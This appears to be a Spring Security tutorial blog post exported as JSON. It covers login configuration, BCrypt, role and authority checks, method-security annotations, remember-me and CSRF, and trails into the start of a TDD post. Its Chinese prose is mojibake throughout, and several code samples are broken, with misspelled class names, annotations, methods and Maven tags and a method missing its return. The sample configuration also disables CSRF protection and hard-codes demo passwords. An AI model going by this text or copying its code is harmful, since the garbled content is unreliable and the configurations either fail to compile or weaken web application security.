ç”¨æˆ·æˆæƒæŒ‡çš„æ˜¯ : éªŒè¯æŸä¸ªç”¨æˆ·æ˜¯å¦æœ‰æƒé™æ‰§è¡ŒæŸä¸ªæ“ä½œã€‚åœ¨åŒä¸€ç³»ç»Ÿä¸­ï¼Œä¸åŒç”¨æˆ·æ‰€å…·æœ‰çš„æƒé™æ˜¯ä¸åŒçš„ã€‚æ¯”å¦‚å¯¹ä¸€ä¸ªæ–‡ä»¶æ¥è¯´ï¼Œæœ‰çš„ç”¨æˆ·åªèƒ½è¿›è¡Œè¯»å–ï¼Œè€Œæœ‰çš„ç”¨æˆ·å¯ä»¥ä¿®æ”¹ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œç³»ç»Ÿä¼šä¸ºä¸åŒçš„ç”¨æˆ·åˆ†é…ä¸åŒçš„è§’è‰²ï¼Œè€Œæ¯ä¸ªè§’è‰²å¯¹åº”ä¸€ç³»åˆ—çš„æƒé™ã€‚==é€šä¿—ç‚¹å°±æ˜¯ç³»ç»Ÿåˆ¤æ–­ç”¨æˆ·æ˜¯å¦æœ‰æƒé™å»åšæŸäº›äº‹æƒ…ã€‚== ğŸ“• Spring Security ç‰¹ç‚¹ : å’ŒSpringæ— ç¼æ•´åˆã€‚ å…¨é¢çš„æƒé™æ§åˆ¶ ä¸“é—¨ä¸ºWebå¼€å‘è€Œè®¾è®¡ æ—§ç‰ˆæœ¬ä¸èƒ½è„±ç¦»Webç¯å¢ƒä½¿ç”¨ æ–°ç‰ˆæœ¬å¯¹æ•´ä¸ªæ¡†æ¶è¿›è¡Œäº†åˆ†å±‚æŠ½å–ï¼Œåˆ†æˆäº†æ ¸å¿ƒæ¨¡å—å’ŒWebæ¨¡å—,å•ç‹¬å¼•å…¥æ ¸å¿ƒæ¨¡å—å°±å¯ä»¥è„±ç¦»Webç¯å¢ƒã€‚ é‡é‡çº§ã€‚ 2. å…¥é—¨æ¡ˆä¾‹ åˆ›å»ºSpringBootå·¥ç¨‹,å¼•å…¥ç›¸å…³ä¾èµ– &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.2.1.RELEASE&lt;/version&gt; &lt;relativePath/&gt; &lt;/parent&gt; &lt;dependencies&gt; &lt;!--Web ä¾èµ–--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--Spring Securityçš„ç›¸å…³ä¾èµ–--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; ç¼–å†™Controllerè¿›è¡Œæµ‹è¯• @RestController public class TestController { @GetMapping(&quot;/add&quot;) public String add() { return &quot;hello Security&quot;; } } 3. SpringSecurityåŸºæœ¬åŸç†ğŸŒ³ Spring Security æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªè¿‡æ»¤å™¨é“¾ FilterSecurityInterceptor : æ˜¯ä¸€ä¸ªæ–¹æ³•çº§çš„æƒé™è¿‡æ»¤å™¨,åŸºæœ¬ä½äºè¿‡æ»¤é“¾çš„æœ€åº•éƒ¨ ExceptionTranslationFilter : æ˜¯ä¸€ä¸ªå¼‚å¸¸è¿‡æ»¤å™¨,ç”¨æ¥å¤„ç†åœ¨è®¤è¯æˆæƒè¿‡ç¨‹ä¸­æŠ›å‡ºçš„å¼‚å¸¸ UsernamePassowrdAuthenticationFilter : å¯¹/loginçš„postè¯·æ±‚åšæ‹¦æˆª,æ ¡éªŒè¡¨å•ä¸­ç”¨æˆ·åå’Œå¯†ç ã€‚ ğŸŒ³ è¿‡æ»¤å™¨æ˜¯å¦‚ä½•è¿›è¡ŒåŠ è½½çš„ï¼Ÿ image-20210206021008467 ğŸŒ³ ä¸¤ä¸ªé‡è¦çš„æ¥å£ âšª UserDetailsServiceæ¥å£è¯¦è§£ å½“ä»€ä¹ˆä¹Ÿæ²¡æœ‰é…ç½®çš„æ—¶å€™,è´¦å·å’Œå¯†ç æ˜¯ç”±SpringSecurityå®šä¹‰ç”Ÿæˆçš„ã€‚è€Œåœ¨å®é™…é¡¹ç›®ä¸­è´¦å·å’Œå¯†ç éƒ½æ˜¯ä»æ•°æ®åº“ä¸­æŸ¥å‡ºæ¥çš„,æ‰€ä»¥æˆ‘ä»¬è¦é€šè¿‡è‡ªå®šä¹‰é€»è¾‘æ§åˆ¶è®¤è¯é€»è¾‘ã€‚==é€šä¿—ç‚¹æ¥è¯´å°±æ˜¯æŸ¥è¯¢ç”¨æˆ·åå’Œå¯†ç çš„è¿‡ç¨‹== å¦‚éœ€è¦è‡ªå®šä¹‰é€»è¾‘æ—¶,åªéœ€è¦å®ç°UserDetailsServiceæ¥å£å³å¯ï¼Œæ¥å£å®šä¹‰å¦‚ä¸‹ : image-20210206022109352 è¿”å›å€¼ UserDetails è¿™ä¸ªç±»æ˜¯ç³»ç»Ÿé»˜è®¤çš„ç”¨æˆ·ä¸»ä½“ // è¡¨ç¤ºè·å–ç™»å½•ç”¨æˆ·çš„æ‰€æœ‰æƒé™ Collection&lt;? extends GrantedAuthority&gt; getAuthorities(); // è¡¨ç¤ºè·å–å¯†ç  String getPassword(); // è¡¨ç¤ºè·å–ç”¨æˆ·å String getUsername(); // è¡¨ç¤ºåˆ¤æ–­ç”¨æˆ·æ˜¯å¦è¢«é”å®š boolean isAccountNonLocked(); // è¡¨ç¤ºå‡­è¯{å¯†ç }æ˜¯å¦è¿‡æœŸ boolean isCredentialsNonExpired(); // è¡¨ç¤ºå½“å‰ç”¨æˆ·åæ˜¯å¦å¯ç”¨ boolean isEnabled(); image-20210206023135919 âšª PasswordEncoder æ¥å£è®²è§£ æ•°æ®åŠ å¯†çš„æ¥å£,ç”¨äºè¿”å›Userå¯¹è±¡é‡Œé¢å¯†ç åŠ å¯† // è¡¨ç¤ºæŠŠå‚æ•°æŒ‰ç…§ç‰¹å®šçš„è§£æè§„åˆ™è¿›è¡Œè§£æ String encode(CharSequence rawPassword); // è¡¨ç¤ºéªŒè¯ä»å­˜å‚¨ä¸­è·å–çš„ç¼–ç å¯†ç ä¸ç¼–ç åæäº¤çš„åŸå§‹å¯†ç æ˜¯å¦åŒ¹é…ã€‚å¦‚æœå¯†ç åŒ¹é…,åˆ™è¿”å›true;å¦‚æœä¸åŒ¹é…,åˆ™è¿”å›falseã€‚ç¬¬ä¸€ä¸ªå‚æ•°è¡¨ç¤ºéœ€è¦è¢«è§£æçš„å¯†ç ã€‚ç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºå­˜å‚¨çš„å¯†ç ã€‚ boolean matches(CharSequence rawPassowrd,String encodePassword); // è¡¨ç¤ºå¦‚æœè§£æçš„å¯†ç èƒ½å¤Ÿå†æ¬¡è¿›è¡Œè§£æä¸”è¾¾åˆ°æ›´å®‰å…¨çš„ç»“æœåˆ™è¿”å›true,å¦åˆ™è¿”å›falseã€‚é»˜è®¤è¿”å›false default boolean upgradeEncoding(String encodePassowrd); âšª BCryptPasswordEncoder BCryptPasswordEncoderæ˜¯Spring Securityå®˜æ–¹æ¨èçš„å¯†ç è§£æå™¨,å¹³æ—¶å¤šä½¿ç”¨è¿™ä¸ªè§£æå™¨ BCryptPasswordEncoderæ˜¯å¯¹bcryptå¼ºæ•£åˆ—æ–¹æ³•çš„å…·ä½“å®ç°ã€‚æ˜¯åŸºäºHashç®—æ³•å®ç°çš„å•å‘åŠ å¯†ã€‚å¯ä»¥é€šè¿‡strengthæ§åˆ¶åŠ å¯†å¼ºåº¦,é»˜è®¤ä¸º10ã€‚ @Test public void test01(){ //åˆ›å»ºå¯†ç è§£æå™¨ BCryptPasswordEncoder bCryptPasswordEncoder=new BCryptPasswrodEncoder(); //å¯¹å¯†ç è¿›è¡ŒåŠ å¯† String password=bCryptPasswordEncoder.encode(&quot;123456&quot;); //æ‰“å°åŠ å¯†åçš„æ•°æ® System.out.println(&quot;åŠ å¯†ä¹‹åçš„æ•°æ®:&quot;+password); //åˆ¤æ–­åŸå­—ç¬¦åŠ å¯†åå’ŒåŠ å¯†ä¹‹å‰æ˜¯å¦åŒ¹é… boolean result=bCryptPasswordEncoder.matches(&quot;123456&quot;,password); } 4. ç”¨æˆ·è®¤è¯ è®¾ç½®ç™»å½•çš„ç”¨æˆ·åå’Œå¯†ç  ç¬¬ä¸€ç§æ–¹å¼ : é€šè¿‡é…ç½®æ–‡ä»¶é…ç½® spring.security.user.name=rikc spring.security.user.password=123456 ç¬¬äºŒç§æ–¹å¼ :é€šè¿‡é…ç½®ç±» package com.wisedu.securitydemo1.config; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder; import org.springframework.security.config.annotation.web.configuration.WebSecurityConfiguration; import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter; import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder; import org.springframework.security.crypto.password.PasswordEncoder; @Configuration public class SecurityConfig extends WebSecurityConfigurerAdapter { @Override protected void configure(AuthenticationManagerBuilder auth) throws Exception { BCryptPasswordEncoder bCryptPasswordEncoder=new BCryptPasswordEncoder(); String password=bCryptPasswordEncoder.encode(&quot;123456&quot;); auth.inMemoryAuthentication().withUser(&quot;rikc&quot;).password(password).roles(&quot;admin&quot;); } @Bean public PasswordEncoder password(){ return new BCryptPasswordEncoder(); } } ç¬¬ä¸‰ç§æ–¹å¼ : è‡ªå®šä¹‰ç¼–å†™å®ç°ç±» Â· ç¬¬ä¸€æ­¥ åˆ›å»ºé…ç½®ç±»,è®¾ç½®ä½¿ç”¨å“ªä¸ªuserDetailsServiceå®ç°ç±» @Configuration public class SecurityConfig1 extends WebSecurityConfigurerAdapter { @Autowired private UserDetailsService userDetailsService; @Override protected void configure(AuthenticationManagerBuilder auth) throws Exception { auth.userDetailsService(userDetailsService).passwordEncoder(password()); } @Bean public PasswordEncoder password(){ return new BCryptPasswordEncoder(); } } Â· ç¬¬äºŒæ­¥ ç¼–å†™å®ç°ç±»,è¿”å›Userå¯¹è±¡,Userå¯¹è±¡æœ‰ç”¨æˆ·åå¯†ç å’Œæ“ä½œæƒé™ @Service(&quot;userDetailsService&quot;) public class MyUserDetailsServie implements UserDetailsService { @Override public UserDetails loadUserByUsername(String s) throws UsernameNotFoundException { List&lt;GrantedAuthority&gt; auths= AuthorityUtils.commaSeparatedStringToAuthorityList(&quot;role&quot;); return new User(&quot;rikc&quot;,new BCryptPasswordEncoder().encode(&quot;123&quot;),auths); } } æŸ¥è¯¢æ•°æ®åº“å®Œæˆè®¤è¯ è¿™æ˜¯åŸºäº(1)é‡Œé¢çš„ç¬¬ä¸‰ç§è‡ªå®šä¹‰ç¼–å†™å®ç°ç±»é€šè¿‡æŸ¥è¯¢æ•°æ®åº“å®Œæˆè®¤è¯æ“ä½œ ğŸ“• å¯¼å…¥ç›¸å…³ä¾èµ– &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.0.5&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connection-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependecy&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/dependecy&gt; ğŸ“• åˆ¶ä½œå®ä½“ç±» @Data public class User{ private Integer id; private String username; private String password } ğŸ“• æ•´åˆmapper,åˆ›å»ºæ¥å£ï¼Œæ“ä½œæ•°æ®åº“æŸ¥è¯¢ 5. è‡ªå®šä¹‰ç”¨æˆ·ç™»å½•ç•Œé¢ é…ç½®ç±»ä¸­å®ç°ç›¸å…³çš„é…ç½® @Configuration public class SecurityConfig1 extends WebSecurityConfigurerAdapter { @Autowired private UserDetailsService userDetailsService; @Override protected void configure(AuthenticationManagerBuilder auth) throws Exception { auth.userDetailsService(userDetailsService).passwordEncoder(password()); } @Bean public PasswordEncoder password(){ return new BCryptPasswordEncoder(); } /** *è‡ªå®šä¹‰ç™»å½•é¡µé¢ */ @Override protected void configure(HttpSecurity http) throws Exception { http.formLogin() //è‡ªå®šä¹‰ç¼–å†™ç™»å½•é¡µé¢ .loginPage(&quot;/login.html&quot;) //ç™»å½•é¡µé¢è®¾ç½® .loginProcessingUrl(&quot;/user/login&quot;) //ç™»å½•è®¿é—®Controllerè·¯å¾„ .defaultSuccessUrl(&quot;/test/index&quot;).permitAll() //ç™»é™†æˆåŠŸä»¥å,è·³è½¬è·¯å¾„ .and().authorizeRequests() .antMatchers(&quot;/&quot;,&quot;/test/hello&quot;,&quot;/user/login&quot;).permitAll()//è®¾ç½®å“ªäº›è·¯å¾„å¯ä»¥ç›´æ¥è®¿é—®ä¸éœ€è¦ç™»å½•è®¤è¯ .anyRequest().authenticated() .and().csrf().disable();//å…³é—­csrfé˜²æŠ¤ } } 6. ç”¨æˆ·æˆæƒ(åŸºäºè§’è‰²æˆ–æƒé™è¿›è¡Œè®¿é—®æ§åˆ¶)6.1 hasAuthority æ–¹æ³•å¦‚æœå½“å‰çš„ä¸»ä½“å…·æœ‰æŒ‡å®šçš„æƒé™,åˆ™è¿”å›true,å¦åˆ™è¿”å›false åœ¨é…ç½®ç±»ä¸­è®¾ç½®å½“å‰è®¿é—®åœ°å€æœ‰å“ªäº›æƒé™ //å½“å‰ç™»å½•ç”¨æˆ·åªæœ‰å…·æœ‰adminsæƒé™æ‰å¯ä»¥è®¿é—®è¿™ä¸ªè·¯å¾„ .antMatchers(&quot;/test/index&quot;).hasAuthority(&quot;admin&quot;) åœ¨UserDetailsService,æŠŠè¿”å›çš„Userå¯¹è±¡è®¾ç½®æƒé™ Users users=userMapper.selectOne(&quot;&quot;); //è®¾ç½®ç”¨æˆ·æƒé™ä¸ºç®¡ç†å‘˜æƒé™ List&lt;GrantedAuthority&gt; auths=AuthorityUtils.commaSeparatedStringToAuthorityList(&quot;admin&quot;); UserDetailsSerivce userDetail=new User(users.getUserName,new BCryptPasswordEncoder().encode(users.getPassword()),auths); 6.2 hasAnyAuthority æ–¹æ³•å¦‚æœå½“å‰çš„ä¸»ä½“æœ‰ä»»ä½•æä¾›çš„è§’è‰²(ç»™å®šçš„ä½œä¸ºä¸€ä¸ªé€—å·åˆ†éš”çš„å­—ç¬¦ä¸²åˆ—è¡¨)çš„è¯,è¿”å›true .anyMatchers(&quot;/test/index&quot;).hasAnyAuthority(&quot;admin,manager&quot;) 6.3 hasRole æ–¹æ³•å¦‚æœç”¨æˆ·å…·å¤‡ç»™å®šè§’è‰²å°±å…è®¸è®¿é—®,å¦åˆ™å‡ºç°403 å¦‚æœå½“å‰ä¸»ä½“å…·æœ‰æŒ‡å®šçš„è§’è‰²,åˆ™è¿”å›true .antMatchers(&quot;/test/index&quot;).hasRole(&quot;role&quot;) //æºç ä¸­è¿›è¡Œäº†å°è£…, éœ€è¦æ·»åŠ ROLE_ã€‚ //æºç  return &quot;hasRole(&#39;ROLE_&quot;+role+&quot;&#39;)&quot;; List&lt;GrantedAuthority&gt; auths=AuthorityUtils.commaSeparatedStringToAuthorityList(&quot;admin,ROLE_role&quot;); æ³¨æ„ : é…ç½®æ–‡ä»¶ä¸­ä¸éœ€è¦æ·»åŠ â€ROLE_â€,å› ä¸ºä¸Šè¿°çš„åº•å±‚æºç ä¼šè‡ªåŠ¨æ·»åŠ ä¸ä¹‹è¿›è¡ŒåŒ¹é…ã€‚ 6.4 hasAnyRole æ–¹æ³•è¡¨ç¤ºç”¨æˆ·å…·å¤‡ä»»ä½•ä¸€ä¸ªæ¡ä»¶éƒ½å¯ä»¥è®¿é—®ã€‚ ç»™ç”¨æˆ·æ·»åŠ è§’è‰²: //ç”¨æˆ·å¯¹è±¡ä¸ä¸ºç©ºè¿”å›å½“å‰ç”¨æˆ· return new User(username,user.getPassword(),AuthorityUtils.commaSeparatedStringToAuthorityList(&quot;admin,role,ROLE_admin,ROLE_role&quot;)); ä¿®æ”¹é…ç½®æ–‡ä»¶ : .antMatchers(&quot;/test/admin&quot;).hasAnyRole(&quot;role&quot;) 7. ç”¨æˆ·æˆæƒ(è‡ªå®šä¹‰403é¡µé¢)åœ¨é…ç½®ç±»é‡Œé¢è¿›è¡Œé…ç½®å³å¯ã€‚ http.execptionHandling().accessDeniedPage(&quot;/unauth&quot;); 8. ç”¨æˆ·æˆæƒ(æ³¨è§£ä½¿ç”¨)8.1 @Securedåˆ¤æ–­æ˜¯å¦å…·æœ‰è§’è‰²,å¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡ŒåŒ¹é…çš„å­—ç¬¦ä¸²éœ€è¦æ·»åŠ å‰ç¼€â€ROLE_â€ã€‚ ä½¿ç”¨æ³¨è§£è¦æå‰å¼€å¯æ³¨è§£åŠŸèƒ½ã€‚ @SpringBootApplication @EnableGlobalMethodSecurity(securedEnabled=true) public class DemosecurityApplication{ public static void main(String[] args){ SpringApplication.run(DemosecurityApplication.class,args); } } åœ¨æ§åˆ¶å™¨æ–¹æ³•ä¸Šæ·»åŠ Controller @RequestMapping(&quot;testSecured&quot;) @ResponseBody @Secured({&quot;ROLE_normal&quot;,&quot;ROLE_admin&quot;}) public String helloUser(){ return &quot;hello,user&quot;; } @Secured({&quot;ROLE_normal&quot;,&quot;Role_ç®¡ç†å‘˜&quot;}) 8.2 @PreAuthorizeå…ˆå¼€å¯æ³¨è§£åŠŸèƒ½ @EnableGlobalMethodSecurity(prePostEnabled=true) @PreAuthorize : æ³¨è§£é€‚åˆè¿›å…¥æ–¹æ³•å‰çš„æƒé™éªŒè¯,@PreAuthorize å¯ä»¥å°†ç™»å½•ç”¨æˆ·çš„roles/permissionså‚æ•°ä¼ å…¥åˆ°æ–¹æ³•ä¸­ã€‚ @RequestMapping(&quot;/preAuthorize&quot;) @ResponseBody @PreAuthorize(&quot;hasAnyAuthority(&#39;menu:system&#39;)&quot;) public String preAuthorize(){ System.out.println(&quot;preAuthorize&quot;); return &quot;preAuthorize&quot;; } 8.3 @PostAuthorizeå…ˆå¼€å¯æ³¨è§£åŠŸèƒ½: @EnableGlobalMethodSecurity(prePostEnabled=true) @PostAuthorize æ³¨è§£ä½¿ç”¨å¹¶ä¸å¤š,åœ¨æ–¹æ³•æ‰§è¡Œåå†è¿›è¡Œæƒé™éªŒè¯ï¼Œé€‚åˆéªŒè¯å¸¦æœ‰è¿”å›å€¼çš„æƒé™ @RequestMapping(&quot;/testPostAuthorize&quot;) @ResponseBody @PostAuthorzie(&quot;hasAnyAuthorize(&#39;menu:system&#39;)&quot;) public String preAuthorize(){ System.out.println(&quot;test-PostAuthorize&quot;); return &quot;PostAuthorize&quot;; } 8.4 @PostFilter@PostFilter : æƒé™éªŒè¯ä¹‹åå¯¹æ•°æ®è¿›è¡Œè¿‡æ»¤,ç•™ä¸‹ç”¨æˆ·åæ˜¯admin1çš„æ•°æ® è¡¨è¾¾å¼ä¸­çš„filterObjectå¼•ç”¨çš„æ˜¯æ–¹æ³•è¿”å›å€¼Listä¸­çš„æŸä¸€ä¸ªå…ƒç´  @RequestMapping(&quot;getAll&quot;) @PreAuthorize(&quot;hasRole(&#39;ROLE_ç®¡ç†å‘˜&#39;)&quot;) @PostFilter(&quot;filterObject.username==&#39;admin1&#39;&quot;) @ResponseBody public List&lt;UserInfo&gt; getAllUser(){ ArrayList&lt;UserInfo&gt; list=new ArrayList&lt;&gt;(); list.add(new UserInfo(1l,&quot;admin1&quot;,&quot;6666&quot;)); list.add(new UserInfo(2l,&quot;admin2&quot;,&quot;6666&quot;)); return list; } 8.5 @PreFilter@PreFilter : è¿›å…¥æ§åˆ¶å™¨ä¹‹å‰å¯¹æ•°æ®è¿›è¡Œè¿‡æ»¤ @RequestMapping(&quot;getTestPreFilter&quot;) @PreAuthorize(&quot;hasRole(&#39;ROLE_ç®¡ç†å‘˜&#39;)&quot;) @PreFilter(value=&quot;filterObject.id%2==0&quot;) @ResonseBody public List&lt;UserInfo&gt; getTestPreFilter(@RequestBody List&lt;UserInfo&gt; list){ list.forEach(t-&gt;{ System.out.println(t.getId()+&quot;\\t&quot;+t.getUsername()); }); } 9. ç”¨æˆ·æ³¨é”€åœ¨é…ç½®ç±»ä¸­æ·»åŠ é€€å‡ºæ˜ å°„åœ°å€ http.logout().logoutUrl(&quot;/logout&quot;).logoutSuccessUrl(&quot;/index&quot;).permitAll(); 10. è‡ªåŠ¨ç™»å½•image-20210210005345863 image-20210210005636400 ç¬¬ä¸€æ­¥ : åˆ›å»ºæ•°æ®åº“è¡¨ CREATE TABLE `persisent_logins`( `username` varchar(64) NOT NULL, `series` varchar(64) NOT NULL, `token` varchar(64) NOT NULL, `last_used` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, PRIMARY KEY(`series`) )ENGINE=InnoDB DEFAULT CHARSET=utf8; ç¬¬äºŒæ­¥ : é…ç½®ç±»,æ³¨å…¥æ•°æ®æº,é…ç½®æ“ä½œæ•°æ®åº“å¯¹è±¡ @Autowired private DataSource dataSource; @Bean public PersistentTokenRepository persistentTokenRespository(){ JdbcTokenRepositoryImpl jdbcTokenRepositoryImpl = new JdbcTokenRepositoryImpl(); jdbcTokenRepositoryImpl.setDataSource(dataSource); //è‡ªåŠ¨ç”Ÿæˆæ•°æ®åº“è¡¨ //jdbcTokenRepositoryImpl.setCreateTableOnStartup(true); return jdbcTokenRepositoryImpl; } .and().rememberMe().tokenRespository(persistentTokenRepository()) .tokenValiditySeconds(60)//è®¾ç½®æœ‰æ•ˆæ—¶é•¿å•ä½æ˜¯ç§’ .userDetailsService(userDetailsService) ç¬¬ä¸‰æ­¥ : é¡µé¢æ·»åŠ è®°ä½æˆ‘å¤é€‰æ¡† è®°ä½æˆ‘ :&lt;input type=&quot;checkbox&quot; name=&quot;remember-me&quot; title=&quot;è®°ä½å¯†ç &quot;/&gt;&lt;br/&gt; æ­¤å¤„ : name å±æ€§å¿…é¡»ä¸º remember-me,ä¸èƒ½æ”¹ä¸ºå…¶ä»–å€¼ 11. CSRFåŠŸèƒ½è·¨åŸŸè¯·æ±‚ä¼ªé€ (è‹±è¯­ : Cross-site request forgery),ä¹Ÿè¢«ç§°ä¸ºone-clickattackæˆ–è€…session riding,é€šå¸¸ç¼©å†™ä¸ºCSRFæˆ–è€…XSRF,æ˜¯ä¸€ç§æŒŸåˆ¶ç”¨æˆ·åœ¨å½“å‰å·²ç™»å½•çš„Webåº”ç”¨ç¨‹åºä¸Šæ‰§è¡Œéæœ¬æ„çš„æ“ä½œçš„æ”»å‡»æ–¹æ³•ã€‚è·Ÿè·¨ç½‘ç«™è„šæœ¬(XSS)ç›¸æ¯”,XSSåˆ©ç”¨çš„æ˜¯ç”¨æˆ·å¯¹æŒ‡å®šç½‘ç«™çš„ä¿¡ä»»ï¼ŒCSRFåˆ©ç”¨çš„æ˜¯ç½‘ç«™å¯¹ç”¨æˆ·ç½‘é¡µæµè§ˆå™¨çš„ä¿¡ä»»ã€‚ è·¨åŸŸè¯·æ±‚æ”»å‡»ï¼Œç®€å•çš„è¯´ï¼Œæ˜¯æ”»å‡»è€…é€šè¿‡ä¸€äº›æŠ€æœ¯æ‰‹æ®µæ¬ºéª—ç”¨æˆ·çš„æµè§ˆå™¨å»è®¿é—®ä¸€ä¸ªè‡ªå·±æ›¾ç»è®¤è¯è¿‡çš„ç½‘ç«™å¹¶è¿è¡Œä¸€äº›æ“ä½œ(å¦‚å‘é‚®ä»¶ï¼Œå‘æ¶ˆæ¯ï¼Œç”šè‡³è´¢äº§æ“ä½œå¦‚è½¬è´¦å’Œè´­ä¹°å•†å“)ã€‚ç”±äºæµè§ˆå™¨æ›¾ç»è®¤è¯è¿‡ï¼Œæ‰€ä»¥è¢«è®¿é—®çš„ç½‘ç«™ä¼šè®¤ä¸ºæ˜¯çœŸæ­£çš„ç”¨æˆ·æ“ä½œè€Œå»è¿è¡Œã€‚è¿™åˆ©ç”¨äº†Webä¸­ç”¨æˆ·èº«ä»½éªŒè¯çš„ä¸€ä¸ªæ¼æ´ : ==ç®€å•çš„èº«ä»½éªŒè¯åªèƒ½ä¿è¯è¯·æ±‚å‘è‡ªæŸä¸ªç”¨æˆ·çš„æµè§ˆå™¨,å´ä¸èƒ½ä¿è¯è¯·æ±‚æœ¬èº«æ˜¯ç”¨æˆ·è‡ªæ„¿å‘å‡ºçš„ã€‚== ä»Spring Security 4.0 å¼€å§‹ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¼šå¼€å¯CSRFä¿æŠ¤ï¼Œä»¥é˜²æ­¢CSRFæ”»å‡»åº”ç”¨ç¨‹åºï¼ŒSpring Security CSRF ä¼šé’ˆå¯¹PATCH,POST,PUTå’ŒDELETEæ–¹æ³•è¿›è¡Œé˜²æŠ¤ã€‚ Spring Security å®ç°CSRFçš„åŸç† : ç”ŸæˆcsrfTokenä¿å­˜åˆ°HttpSessionæˆ–è€…Cookieä¸­. æ¡ˆä¾‹ : åœ¨ç™»å½•é¡µé¢æ·»åŠ ä¸€ä¸ªéšè—åŸŸ : &lt;input type=&quot;hidden&quot; th:if=&quot;${_csrf}!=null&quot; th:value=&quot;${_csrf.token}&quot; name=&quot;_csrf&quot;/&gt; å…³é—­å®‰å…¨é…ç½®çš„ç±»ä¸­çš„csrf : //http.csrf().disable(); æ·»åŠ ä¾èµ– &lt;!--å¯¹thymeleafæ·»åŠ  Spring Securityæ ‡ç­¾æ”¯æŒ--&gt; &lt;dependency&gt; &lt;groupId&gt;org.thymeleaf.extras&lt;/groupId&gt; &lt;artifactId&gt;thymeleaf-extras-springsecurity5&lt;/artifactId&gt; &lt;/dependency&gt;","categories":[],"tags":[]},{"title":"Improve Robustness (2)","slug":"improve-robustness-(2)","date":"2021-05-12T18:49:03.000Z","updated":"2021-05-27T07:14:21.286Z","comments":true,"path":"improve-robustness-(2)/","link":"","permalink":"https://blog.kayleh.top/improve-robustness-(2)/","excerpt":"","text":"TDDæµ‹è¯•é©±åŠ¨å¼€å‘ç”¨æˆ·æä¾›çš„ä¿¡æ¯ï¼š ç”¨æˆ·æ˜µç§°(é•¿åº¦æœ€é•¿ä¸º20ä¸ªå­—èŠ‚ï¼Œå³æœ€é•¿20ä¸ªè‹±æ–‡å•è¯ï¼Œ10ä¸ªæ±‰å­—)(å¿…é¡»ä¼ å…¥) ç”¨æˆ·æ€§åˆ«(1ä»£è¡¨ç”·ï¼Œ2ä»£è¡¨å¥³)(å¿…é¡»ä¼ å…¥) ç”¨æˆ·å‡ºç”Ÿæ—¥æœŸ(æ ¼å¼ä¸ºYYYY-MM-DD)(å¿…é¡»ä¼ å…¥) ç”¨æˆ·ç®€ä»‹(é•¿åº¦æœ€é•¿ä¸º40ä¸ªå­—èŠ‚ï¼Œå³æœ€é•¿40ä¸ªè‹±æ–‡å•è¯ï¼Œ20ä¸ªæ±‰å­—)(å¿…é¡»ä¼ å…¥) å¼‚å¸¸æƒ…å†µï¼š ç”¨æˆ·æ²¡æœ‰ä¼ å…¥è¡¨æ˜ç”¨æˆ·èº«ä»½çš„uuid ç”¨æˆ·ä¼ å…¥äº†ä¸€ä¸ªé”™è¯¯çš„uuid,å³ä¸å­˜åœ¨çš„ç”¨æˆ· ç”¨æˆ·æ²¡æœ‰ä¼ å…¥å¿…è¦çš„å‚æ•°ï¼Œæ¯”å¦‚ç¼ºå°‘ç”¨æˆ·æ˜µç§°ï¼Œç”¨æˆ·æ€§åˆ«ç­‰ ç”¨æˆ·ä¼ äº†ä¸åˆæ³•çš„å‚æ•°ï¼Œæ¯”å¦‚ä¼ å…¥äº†ç”¨æˆ·çš„å¯†ç  ä¼ å…¥çš„ç”¨æˆ·æ˜µç§°ä¸ºnull ä¼ å…¥çš„ç”¨æˆ·æ˜µç§°ä¸ºâ€â€(å³ç©ºå­—ç¬¦ä¸²) ä¼ å…¥çš„ç”¨æˆ·æ˜µç§°é•¿åº¦å¤§äº20å­—èŠ‚ ä¼ å…¥çš„ç”¨æˆ·æ˜µç§°ä¸ºä¸æ”¯æŒçš„å­—ç¬¦ç¼–ç  ä¼ å…¥çš„ç”¨æˆ·æ€§åˆ«æ ¼å¼ä¸æ­£ç¡®ï¼Œæ¯”å¦‚ä¼ å…¥â€™womanâ€™ ä¼ å…¥çš„ç”¨æˆ·æ€§åˆ«çš„å–å€¼ä¸æ­£ç¡®ï¼Œæ¯”å¦‚ä¼ å…¥äº†â€™3â€™ ä¼ å…¥çš„ç”¨æˆ·å‡ºç”Ÿæ—¥æœŸæ ¼å¼ä¸æ­£ç¡®ï¼Œæ¯”å¦‚ä¼ å…¥çš„æ ¼å¼ä¸ºâ€™YYYY-MM-DD hh:mm:ssâ€™ ä¼ å…¥çš„ç”¨æˆ·å‡ºç”Ÿæ—¥æœŸå–å€¼ä¸æ­£ç¡®ï¼Œæ¯”å¦‚ç°åœ¨æ˜¯2017å¹´ï¼Œä»–ä¼ å…¥çš„ç”¨æˆ·å¹´ä»½æ˜¯2018æˆ–è€…1800ï¼Œä¼ å…¥çš„æœˆä»½æ˜¯13,ç­‰ ä¼ å…¥çš„ç”¨æˆ·ç®€ä»‹ä¸ºnull ä¼ å…¥çš„ç”¨æˆ·ç®€ä»‹ä¸ºâ€â€(å³ç©ºå­—ç¬¦ä¸²) ä¼ 